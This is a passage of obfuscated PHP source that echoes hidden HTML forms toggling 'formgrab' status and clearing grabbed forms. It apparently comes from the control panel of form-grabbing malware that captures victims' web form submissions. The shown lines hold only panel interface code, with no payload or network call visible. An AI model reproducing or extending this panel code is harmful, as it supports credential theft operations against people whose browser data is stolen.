    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"clear_hidden_all_forms_7d_submit\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"set_formgrab_status_on\" method=\"post\" action=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"set_formgrab_status_submit_on\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"set_formgrab_status_off\" method=\"post\" action=\"";
    echo _obfuscated_0D39380D261501220C211A2B11123C2F0614010F360732_("");
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"set_formgrab_status_submit_off\" value=\"yes\">\r\n\t\t\t</form>\r\n\t";
}

?>